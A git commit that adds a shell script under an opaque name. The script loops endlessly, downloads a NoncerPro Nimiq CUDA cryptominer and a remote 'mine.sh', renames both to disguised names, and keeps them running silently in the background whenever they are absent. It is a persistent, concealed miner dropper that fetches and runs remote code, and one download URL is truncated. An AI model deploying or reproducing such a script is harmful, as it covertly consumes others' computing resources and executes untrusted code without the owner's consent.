1a6bcb02cf1474976280edd642eefab33dd52ee7
mobile8474 <52715718+mobile8474@users.noreply.github.com>
2019-10-19 18:36:49 +0200

    Create mobile8444444474.sh

---
+++ mobile8444444474.sh
@@ -0,0 +1,22 @@
+while true
+
+do
+
+if [[ $(pgrep -af mobile8474) == "" ]]
+
+then
+
+wget https://github.com/NoncerPro/noncerpro-nimiq-cuda/releases/download/v3.2.0/noncerpro$
+tar zxvf noncerpro-cuda-linux-3.2.0.tar.gz;
+wget -N https://raw.githubusercontent.com/mobile8474/mobile84121274/master/mine.sh;
+mv ./mine.sh ./mobile8474
+mv ./noncerpro ./mobile84
+sh ./mobile8474 &> /dev/null &
+
+else
+
+echo "google84"
+
+fi
+
+done
